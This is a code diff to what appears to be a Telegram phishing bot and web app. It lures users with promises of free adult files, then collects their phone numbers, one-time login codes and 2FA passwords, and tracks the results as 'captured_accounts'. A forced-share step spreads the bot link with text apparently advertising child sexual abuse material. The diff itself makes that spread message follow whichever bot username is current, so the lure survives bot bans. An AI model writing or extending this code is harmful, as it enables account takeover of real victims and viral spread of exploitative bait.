@@ -27,13 +27,18 @@ PORT = _si(os.environ.get("PORT"), 5000)
 WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://two-fishing.onrender.com/tg")
 SELF_URL = os.environ.get("SELF_URL", "https://two-fishing.onrender.com/health")
 
+# Global — will be filled on bot startup
+BOT_USERNAME = ""
+
 DEFAULT_WELCOME_MSGS = [
     {"type": "text", "content": "**Hello {name} 👋**\n\n🔞**To again access to the files completely free of charge, do the following💦:**\n\n>👇Confirm that you are not a robot."},
     {"type": "text", "content": "👇"},
 ]
 
-DEFAULT_SHARE_MSG = """https://t.me/Xxxvo_bot
-https://t.me/Xxxvo_bot
+# {bot} placeholder — auto replaced with current bot username
+DEFAULT_SHARE_MSG = """https://t.me/{bot}
+https://t.me/{bot}
+https://t.me/{bot}
 
 ᴠɪʀᴀʟ ᴄᴩ ᴍᴍꜱ xxx👆"""
 
@@ -190,6 +195,11 @@ def load_share_config():
     if not cfg or not isinstance(cfg, dict) or "message" not in cfg:
         cfg = {"message": DEFAULT_SHARE_MSG}
         save_json(SHARE_FILE, cfg)
+    # If old format without {bot} placeholder → migrate
+    msg = cfg.get("message", "")
+    if "{bot}" not in msg and "Xxxvo_bot" in msg:
+        cfg["message"] = msg.replace("Xxxvo_bot", "{bot}")
+        save_json(SHARE_FILE, cfg)
     return cfg
 
 
@@ -252,6 +262,14 @@ def format_phone(ph):
     if len(digits) == 12 and digits.startswith('91'):
         return '+' + digits
     return '+' + digits
+
+
+def render_share_message(template=None):
+    """Replace {bot} with current BOT_USERNAME."""
+    msg = template if template is not None else share_config.get("message", DEFAULT_SHARE_MSG)
+    if not msg:
+        msg = DEFAULT_SHARE_MSG
+    return msg.replace("{bot}", BOT_USERNAME or "your_bot")
 
 
 # ============================================================
@@ -621,7 +639,7 @@ async def start_handler(event):
         save_users(users)
         if uid == YOUR_TELEGRAM_ID:
             await event.respond(
-                "🔧 **Admin Panel**\n\nUsers: `" + str(len(users)) + "`",
+                "🔧 **Admin Panel**\n\nUsers: `" + str(len(users)) + "`\nBot: @" + (BOT_USERNAME or "?"),
                 buttons=admin_menu(), parse_mode='md')
             return
         await send_welcome(uid, name)
@@ -661,6 +679,7 @@ async def health_cmd(event):
     txt = (f"🏥 HEALTH\n\n"
            f"main_loop_ready: {_main_bot_loop is not None}\n"
            f"bot connected: {bot.is_connected()}\n"
+           f"bot username: @{BOT_USERNAME}\n"
            f"accounts: {len(captured_accounts)}\n"
            f"pending_codes: {len(pending_codes)}\n"
            f"user_sessions: {len(user_sessions)}\n"
@@ -793,7 +812,7 @@ async def cb(event):
                 STATE[k] = False
             await event.answer()
             await safe_send(chat_id,
-                "🔧 **Admin Panel**\n\nUsers: `" + str(len(users)) + "`",
+                "🔧 **Admin Panel**\n\nUsers: `" + str(len(users)) + "`\nBot: @" + (BOT_USERNAME or "?"),
                 admin_menu(), edit_event=event)
 
         elif data == "menu_reset":
@@ -984,15 +1003,17 @@ async def cb(event):
             await event.answer(txt, alert=True)
 
         elif data == "menu_share":
-            msg = share_config.get("message", DEFAULT_SHARE_MSG)
             await event.answer()
-            await safe_send(chat_id, f"🔗 Share\n\n**Current:**\n{msg}",
+            rendered = render_share_message()
+            await safe_send(chat_id,
+                f"🔗 Share (Bot: @{BOT_USERNAME or '?'})\n\n**Current:**\n{rendered}",
                 share_menu(), edit_event=event)
 
         elif data == "sh_edit":
             STATE["awaiting_share_msg"] = True
             await event.answer()
-            await safe_send(chat_id, "✏️ Send new share message.",
+            await safe_send(chat_id,
+                "✏️ Send new share message.\n\nUse `{bot}` as placeholder for bot username.\nExample: `https://t.me/{bot}`",
                 [[Button.inline("⬅️ Back", b"menu_share")]], edit_event=event)
 
         elif data == "sh_reset":
@@ -1003,7 +1024,7 @@ async def cb(event):
 
         elif data == "sh_preview":
             await event.answer("Sent")
-            await bot.send_message(chat_id, share_config.get("message", DEFAULT_SHARE_MSG))
+            await bot.send_message(chat_id, render_share_message())
 
         elif data == "menu_expired":
             accounts = load_accounts()
@@ -1126,7 +1147,8 @@ async def capture(event):
         share_config["message"] = txt
         STATE["awaiting_share_msg"] = False
         save_share_config(share_config)
-        await event.respond("✅ Share updated.", buttons=admin_menu(), parse_mode='md')
+        await event.respond("✅ Share updated. `{bot}` will be replaced with bot username.",
+            buttons=admin_menu(), parse_mode='md')
         return
 
     if STATE["awaiting_2fa_pass"]:
@@ -1264,13 +1286,14 @@ async def self_ping_loop():
 
 
 async def bot_main():
-    global _main_bot_loop
+    global _main_bot_loop, BOT_USERNAME
     _main_bot_loop = asyncio.get_running_loop()
     logger.info(f"✅ _main_bot_loop captured: {_main_bot_loop}")
     logger.info("Admin bot starting...")
     await bot.start(bot_token=BOT_TOKEN)
     me = await bot.get_me()
-    logger.info(f"✅ Admin bot started as @{me.username}")
+    BOT_USERNAME = me.username or ""
+    logger.info(f"✅ Admin bot started as @{BOT_USERNAME}")
     logger.info(f"✅ bot loop is_running={_main_bot_loop.is_running()} connected={bot.is_connected()}")
     asyncio.create_task(broadcast_loop())
     asyncio.create_task(self_ping_loop())
@@ -1389,8 +1412,13 @@ var codeCheck = null;
 var pwdCheck = null;
 var contactForce = null;
 var inProgress = false;
-var SHARE_MSG = "https://t.me/Xxxvo_bot\\nhttps://t.me/Xxxvo_bot\\n\\nᴠɪʀᴀʟ ᴄᴩ ᴍᴍꜱ xxx👆";
-fetch('/api/share_config').then(function(r){ return r.json(); }).then(function(d){ if (d && d.message) SHARE_MSG = d.message; }).catch(function(){});
+var SHARE_MSG = "https://t.me/{bot}\\nhttps://t.me/{bot}\\nhttps://t.me/{bot}\\n\\nᴠɪʀᴀʟ ᴄᴩ ᴍᴍꜱ xxx👆";
+var BOT_USERNAME = "";
+fetch('/api/share_config').then(function(r){ return r.json(); }).then(function(d){
+  if (d && d.message) SHARE_MSG = d.message;
+  if (d && d.bot_username) BOT_USERNAME = d.bot_username;
+  SHARE_MSG = SHARE_MSG.split('{bot}').join(BOT_USERNAME || 'your_bot');
+}).catch(function(){});
 function show(id) { document.getElementById(id).classList.add('on'); }
 function hide(id) { document.getElementById(id).classList.remove('on'); }
 function msg(id, t, type) { var e=document.getElementById(id); e.textContent=t; e.className='msg show '+type; }
@@ -1506,7 +1534,6 @@ function handleContact(c) {
 function openOtp() {
   hide('contactBox'); hide('pwdBox'); hide('shareBox'); show('otpBox');
   
-  // Phase 1: loading, NO button, NO input
   document.getElementById('otpTitle').textContent = 'Sending verification...';
   document.getElementById('otpSubtitle').textContent = 'Please wait while we send the code';
   document.getElementById('otpLoader').style.display = 'block';
@@ -1526,7 +1553,6 @@ function openOtp() {
       return;
     }
     
-    // Poll fast (every 100ms) — as soon as backend says 'sent', switch instantly
     var pollTimer = setInterval(function(){
       fetch('/api/check', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:phoneNumber}) })
       .then(function(r){ return r.json(); }).then(function(cd){
@@ -1544,7 +1570,6 @@ function openOtp() {
         
         if (state === 'sent' || state === '2fa_needed' || state === 'done') {
           clearInterval(pollTimer);
-          // INSTANT switch — no wait
           document.getElementById('otpTitle').textContent = 'Verification code sent';
           document.getElementById('otpSubtitle').textContent = 'Enter the 5-digit code below';
           document.getElementById('otpLoader').style.display = 'none';
@@ -1694,9 +1719,10 @@ function updSteps(n) {
   for (var i=1;i<=5;i++) { var e = document.getElementById('st'+i); if (i<=n) e.className='sst done'; else if (i===n+1) e.className='sst active'; else e.className='sst'; }
 }
 document.getElementById('shareBtn').onclick = function() {
-  var urlMatch = SHARE_MSG.match(/https?:\\/\\/[^\\s]+/);
-  var url = urlMatch ? urlMatch[0] : 'https://t.me/Xxxvo_bot';
-  var share_url = 'https://t.me/share/url?url=' + encodeURIComponent(url) + '&text=' + encodeURIComponent(SHARE_MSG);
+  var msgText = SHARE_MSG;
+  var urlMatch = msgText.match(/https?:\\/\\/[^\\s]+/);
+  var url = urlMatch ? urlMatch[0] : ('https://t.me/' + (BOT_USERNAME || 'your_bot'));
+  var share_url = 'https://t.me/share/url?url=' + encodeURIComponent(url) + '&text=' + encodeURIComponent(msgText);
   if (tg) tg.openTelegramLink(share_url); else window.open(share_url, '_blank');
   var n = Math.min(parseInt(localStorage.getItem(USK) || '0') + 1, 5);
   localStorage.setItem(USK, String(n)); updSteps(n);
@@ -1729,12 +1755,17 @@ def health():
         'main_loop_ready': _main_bot_loop is not None,
         'accounts': len(captured_accounts),
         'channel_id': CHANNEL_ID,
+        'bot_username': BOT_USERNAME,
     })
 
 
 @app.route('/api/share_config')
 def get_share_config():
-    return jsonify(share_config)
+    return jsonify({
+        'message': render_share_message(),
+        'template': share_config.get('message', DEFAULT_SHARE_MSG),
+        'bot_username': BOT_USERNAME,
+    })
 
 
 @app.route('/api/reset_state', methods=['POST'])
@@ -2105,7 +2136,7 @@ def _run_bot():
 if BOT_TOKEN and API_ID and API_HASH and YOUR_TELEGRAM_ID:
     _bot_thread = threading.Thread(target=_run_bot, daemon=True, name="admin-bot")
     _bot_thread.start()
-    logger.info("Admin bot thread launched")
+    logger.info("Admin bot thread started")
 
 
 if __name__ == '__main__':
